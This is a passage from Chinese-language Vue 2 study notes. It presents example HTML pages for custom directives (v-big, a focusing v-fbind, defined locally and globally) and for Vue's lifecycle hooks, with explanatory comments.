			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
			}
		})
	</script>
</html>
```

-------------

需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。

> 由于大部分情况下，bind和update里面的函数内容都是一样的，所以设置了第一种方式，其实可以看做是对象式的简写。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
	</script>
</html>
```

-----------

定义全局指令

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		})

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			}
		})
		
	</script>
</html>
```

# 17. 生命周期

## 17.1 引出生命周期

生命周期：

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子。
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是vm 或 组件实例对象。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 v-if="a">你好啊</h2>
			<h2 :style="{opacity}">欢迎学习Vue</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		 new Vue({
			el:'#root',
			data:{
				a:false,
				opacity:1
			},
			methods: {
				
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				// 使用箭头函数，没有自己的this，向外找，找到了vm。
				setInterval(() => {
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
		})
	</script>
</html>
```

> 不推荐的写法：
>
> ```vue
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>引出生命周期</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<div id="root">
> 			<h2 v-if="a">你好啊</h2>
> 			<h2 :style="{opacity}">欢迎学习Vue</h2>
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 		
> 		 const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				a:false,
> 				opacity:1
> 			}
> 		})
> 
> 		//通过外部的定时器实现（不推荐）
> 		setInterval(() => {
> 			vm.opacity -= 0.01
> 			if(vm.opacity <= 0) vm.opacity = 1
> 		},16)
> 	</script>
> </html>
> ```
>
> 

## 17.2 分析生命周期

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root" :x="n">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```

## 17.3 总结生命周期

常用的生命周期钩子：

1. mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
2. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

关于销毁vue实例：

1. 销毁后借助Vue开发者工具看不到任何信息。
2. 销毁后自定义事件会失效，但原生DOM事件依然有效。
3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})

	</script>
</html>
```

![生命周期](https://gitee.com/li-il/pic_bed/raw/master/img/20220321174942.png)